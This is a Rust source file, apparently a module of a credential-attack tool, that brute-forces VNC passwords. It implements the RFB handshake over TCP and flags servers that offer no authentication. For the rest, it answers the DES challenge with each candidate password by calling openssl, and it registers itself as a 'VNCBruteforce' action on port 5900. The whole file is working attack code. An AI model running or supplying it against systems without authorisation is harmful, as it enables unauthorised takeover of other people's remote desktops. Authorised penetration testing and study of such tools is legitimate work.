use std::time::Duration;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

use super::{BruteForceAction, Connector};

/// VNC password brute force — raw TCP RFB handshake.
/// VNC auth only uses password (no username). The "user" field is ignored.
pub struct VncConnector;

impl Connector for VncConnector {
    fn try_connect(
        &self,
        ip: &str,
        port: u16,
        _user: &str,
        password: &str,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = bool> + Send + '_>> {
        let ip = ip.to_string();
        let password = password.to_string();
        Box::pin(async move { vnc_try_connect(&ip, port, &password).await })
    }
}

async fn vnc_try_connect(ip: &str, port: u16, password: &str) -> bool {
    let addr = format!("{ip}:{port}");
    let result = tokio::time::timeout(Duration::from_secs(10), async {
        let mut stream = TcpStream::connect(&addr).await.ok()?;
        let mut buf = [0u8; 256];

        // Step 1: Read server protocol version (e.g. "RFB 003.008\n")
        let n = stream.read(&mut buf).await.ok()?;
        if n < 12 || !buf[..3].starts_with(b"RFB") {
            return None;
        }

        // Step 2: Send client protocol version
        stream.write_all(b"RFB 003.008\n").await.ok()?;

        // Step 3: Read security types
        let n = stream.read(&mut buf).await.ok()?;
        if n == 0 {
            return None;
        }

        // Check if no-auth (type 1) is offered — that means access is open
        let num_types = buf[0] as usize;
        if num_types == 0 {
            return None; // Connection rejected
        }
        let types = &buf[1..1 + num_types.min(n - 1)];

        if types.contains(&1) {
            // No authentication required — VNC is open!
            return Some(());
        }

        if types.contains(&2) {
            // VNC authentication (DES challenge-response)
            stream.write_all(&[2]).await.ok()?; // Select VNC auth

            // Read 16-byte challenge
            let mut challenge = [0u8; 16];
            stream.read_exact(&mut challenge).await.ok()?;

            // DES-encrypt challenge with password (VNC uses a reversed-bit DES key)
            let response = vnc_des_encrypt(&challenge, password);
            stream.write_all(&response).await.ok()?;

            // Read auth result (4 bytes, 0 = OK)
            let mut result = [0u8; 4];
            stream.read_exact(&mut result).await.ok()?;
            if result == [0, 0, 0, 0] {
                return Some(());
            }
        }

        None
    })
    .await;

    matches!(result, Ok(Some(())))
}

/// VNC DES encryption: the password is truncated/padded to 8 bytes,
/// each byte has its bits reversed, then used as DES key to encrypt the challenge.
/// We shell out to openssl for simplicity (avoids adding a DES crate).
fn vnc_des_encrypt(challenge: &[u8; 16], password: &str) -> Vec<u8> {
    // Pad/truncate password to 8 bytes
    let mut key = [0u8; 8];
    for (i, &b) in password.as_bytes().iter().take(8).enumerate() {
        key[i] = b;
    }
    // Reverse bits in each byte (VNC quirk)
    for byte in &mut key {
        *byte = byte.reverse_bits();
    }

    // Use openssl enc to do DES-ECB encryption
    // This is a blocking operation but happens rarely and is fast
    let key_hex: String = key.iter().map(|b| format!("{b:02x}")).collect();
    let challenge_hex: String = challenge.iter().map(|b| format!("{b:02x}")).collect();

    let output = std::process::Command::new("openssl")
        .args([
            "enc",
            "-des-ecb",
            "-nopad",
            "-K",
            &key_hex,
            "-in",
            "/dev/stdin",
        ])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::null())
        .spawn()
        .and_then(|mut child| {
            if let Some(ref mut stdin) = child.stdin {
                use std::io::Write;
                stdin.write_all(challenge).ok();
            }
            child.wait_with_output()
        });

    match output {
        Ok(o) if o.stdout.len() == 16 => o.stdout,
        _ => vec![0u8; 16], // Fallback: will fail auth
    }
}

pub fn create_action() -> BruteForceAction<VncConnector> {
    BruteForceAction::new(VncConnector, "VNCBruteforce", "vnc", 5900, None, 10)
}
